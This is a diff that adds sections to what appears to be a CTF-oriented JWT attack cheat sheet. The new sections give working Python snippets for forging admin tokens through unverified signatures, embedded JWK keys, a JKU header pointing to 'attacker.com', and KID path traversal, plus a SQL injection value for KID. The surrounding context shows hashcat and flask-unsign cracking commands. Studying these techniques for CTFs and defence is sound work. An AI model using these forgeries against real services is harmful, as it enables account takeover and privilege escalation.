@@ -5,6 +5,10 @@
   - [Algorithm None](#algorithm-none)
   - [Algorithm Confusion (RS256 → HS256)](#algorithm-confusion-rs256-hs256)
   - [Weak Secret Brute-Force](#weak-secret-brute-force)
+  - [Unverified Signature (Crypto-Cat)](#unverified-signature-crypto-cat)
+  - [JWK Header Injection (Crypto-Cat)](#jwk-header-injection-crypto-cat)
+  - [JKU Header Injection (Crypto-Cat)](#jku-header-injection-crypto-cat)
+  - [KID Path Traversal (Crypto-Cat)](#kid-path-traversal-crypto-cat)
   - [JWT Balance Replay (MetaShop Pattern)](#jwt-balance-replay-metashop-pattern)
 - [Password/Secret Inference from Public Data](#passwordsecret-inference-from-public-data)
 - [Weak Signature/Hash Validation Bypass](#weak-signaturehash-validation-bypass)
@@ -41,6 +45,74 @@ const token = jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' })
 flask-unsign --decode --cookie "eyJ..."
 hashcat -m 16500 jwt.txt wordlist.txt
 ```
+
+### Unverified Signature (Crypto-Cat)
+Server decodes JWT without verifying the signature. Modify payload claims and re-encode with the original (unchecked) signature:
+```python
+import jwt, base64, json
+
+token = "eyJ..."
+parts = token.split('.')
+payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
+payload['sub'] = 'administrator'
+new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
+forged = f"{parts[0]}.{new_payload}.{parts[2]}"
+```
+**Key insight:** Some JWT libraries have separate `decode()` (no verification) and `verify()` functions. If the server uses `decode()` only, the signature is never checked.
+
+### JWK Header Injection (Crypto-Cat)
+Server accepts JWK (JSON Web Key) embedded in JWT header without validation. Sign with attacker-generated RSA key, embed matching public key:
+```python
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.backends import default_backend
+import jwt, base64
+
+private_key = rsa.generate_private_key(65537, 2048, default_backend())
+public_numbers = private_key.public_key().public_numbers()
+
+jwk = {
+    "kty": "RSA",
+    "kid": original_header['kid'],
+    "e": base64.urlsafe_b64encode(public_numbers.e.to_bytes(3, 'big')).rstrip(b'=').decode(),
+    "n": base64.urlsafe_b64encode(public_numbers.n.to_bytes(256, 'big')).rstrip(b'=').decode()
+}
+forged = jwt.encode({"sub": "administrator"}, private_key, algorithm='RS256', headers={'jwk': jwk})
+```
+**Key insight:** Server extracts the public key from the token itself instead of using a stored key. Attacker controls both the key and the signature.
+
+### JKU Header Injection (Crypto-Cat)
+Server fetches public key from URL specified in JKU (JSON Key URL) header without URL validation:
+```python
+# 1. Host JWKS at attacker-controlled URL
+jwks = {"keys": [attacker_jwk]}  # POST to webhook.site or attacker server
+
+# 2. Forge token pointing to attacker JWKS
+forged = jwt.encode(
+    {"sub": "administrator"},
+    attacker_private_key,
+    algorithm='RS256',
+    headers={'jku': 'https://attacker.com/.well-known/jwks.json'}
+)
+```
+**Key insight:** Combines SSRF with token forgery. Server makes an outbound request to fetch the key, trusting whatever URL the token specifies.
+
+### KID Path Traversal (Crypto-Cat)
+KID (Key ID) header used in file path construction for key lookup. Point to predictable file:
+```python
+# /dev/null returns empty bytes -> HMAC key is empty string
+forged = jwt.encode(
+    {"sub": "administrator"},
+    '',  # Empty string as secret
+    algorithm='HS256',
+    headers={"kid": "../../../dev/null"}
+)
+```
+**Variants:**
+- `../../../dev/null` → empty key
+- `../../../proc/sys/kernel/hostname` → predictable key content
+- SQL injection in KID: `' UNION SELECT 'known-secret' --` (if KID queries a database)
+
+**Key insight:** KID is meant to select which key to use for verification. When used in file paths or SQL queries without sanitization, it becomes an injection vector.
 
 ### JWT Balance Replay (MetaShop Pattern)
 1. Sign up → get JWT with balance=$100 (save this JWT)
